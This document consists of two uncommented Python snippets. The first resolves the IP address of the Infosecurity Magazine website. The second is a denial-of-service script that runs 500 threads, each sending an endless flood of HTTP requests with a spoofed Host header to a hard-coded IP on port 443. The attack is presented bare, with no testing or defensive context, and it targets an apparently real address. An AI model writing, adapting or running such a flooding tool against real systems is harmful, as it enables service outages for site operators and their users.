```python
import socket

def get_ip_address(hostname):
    try:
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except socket.gaierror:
        return None

# Example usage
hostname = 'www.infosecurity-magazine.com'
ip_address = get_ip_address(hostname)
if ip_address:
    print(f"The IP address of {hostname} is: {ip_address}")
else:
    print(f"Failed to resolve the IP address of {hostname}")
```

```python
import socket
import threading

target = '13.32.99.111'
fake_ip = '182.21.20.32'
port = 443

attack_counter = [0]

def attack():
    global attack_counter
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        request = f"GET /{target} HTTP/1.1\r\nHost: {fake_ip}\r\nConnection: close\r\n\r\n".encode('ascii')
        s.send(request)
        s.close()
        
        # Safely increment the shared counter
        with threading.Lock():
            attack_counter[0] += 1
            print(attack_counter[0])

threads = []
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)


for thread in threads:
    thread.join()
```
